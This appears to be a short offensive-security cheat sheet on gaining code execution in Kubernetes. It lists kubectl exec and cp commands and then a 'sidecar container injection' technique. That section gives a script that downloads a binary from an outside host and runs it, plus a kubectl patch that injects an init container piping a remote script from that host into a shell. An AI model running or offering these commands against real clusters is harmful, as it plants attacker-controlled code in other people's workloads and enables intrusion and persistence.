# Execution

## exec via kubectl

```bash
# query if you have the rights to create a "pods/exec" subresource
kubectl auth can-i create pods/exec
# being able to create this subresource effectively means the ability to execute following operations:

# execute command inside the pod’s first container
kubectl exec $POD_NAME -- $COMMAND

# copy file into the pod
kubectl cp $LOCAL_PATH $POD_NAME:$REMOTE_PATH
```

- When Exec-ing into a pod, you will by default exec into the first container listed in the pod manifest. If there are multiple containers in a pod you can list them using `kubectl get pods <pod_name> -o jsonpath='{.spec.containers[*].name}'` which will output the names of each container. Once you have the name of a container you can target it using kubectl with the -c flag: `kubectl exec -it <pod_name> -c <container_name> -- sh`

## sidecar container injection

```sh
# agent.sh

BINARY_URL="http://192.168.88.250:9595/agent.elf"
TARGET_PATH="/tmp/agent"

curl -L -f -o "$TARGET_PATH" "$BINARY_URL"
chmod +x "$TARGET_PATH"
exec "$TARGET_PATH"
```

```bash
kubectl patch deploy nginx-demo -n test --type='strategic' --patch '
spec:
  template:
    spec:
      initContainers:
      - name: setup-script
        image: curlimages/curl
        command: ["/bin/sh", "-c"]
        args: ["curl -s http://192.168.88.250:9595/agent.sh | sh"]
'
```
